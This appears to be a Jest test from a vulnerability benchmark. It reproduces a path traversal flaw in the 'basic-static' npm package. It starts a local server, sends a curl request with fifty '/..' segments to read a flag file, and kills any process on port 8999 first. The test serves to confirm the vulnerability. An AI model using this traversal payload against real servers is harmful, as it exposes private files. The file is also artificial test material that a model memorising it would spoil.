const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v117 = '/..'.repeat(50);
    const v118 = v117 + pathToFlag;
    return v118;
};
const v135 = done => {
    const v119 = expect.assertions(1);
    v119;
    const basicStatic = require('basic-static');
    const v120 = process.cwd();
    const v121 = {
        rootDir: v120,
        compress: true
    };
    const serveStatic = basicStatic(v121);
    const http = require('http');
    const fs = require('fs');
    const v122 = require('child_process');
    const exec = v122.exec;
    const v123 = fs.readFileSync(pathToFlag);
    let hostsFile = v123.toString();
    const a = require('child_process');
    try {
        const v124 = () => {
        };
        const v125 = a.execSync('fuser -k 8999/tcp', v124);
        v125;
    } catch (e) {
    }
    const v127 = function (req, res) {
        const v126 = serveStatic(req, res);
        v126;
    };
    const server = http.createServer(v127);
    const v128 = server.listen(8999);
    v128;
    const v129 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8999${ v129 }"`;
    const v133 = (error, stdout) => {
        const v130 = expect(stdout);
        const v131 = v130.toBe(hostsFile);
        v131;
        const v132 = done();
        v132;
    };
    const v134 = exec(attack_string, v133);
    v134;
};
const v136 = test('Path Traversal in basic-static', v135);
v136;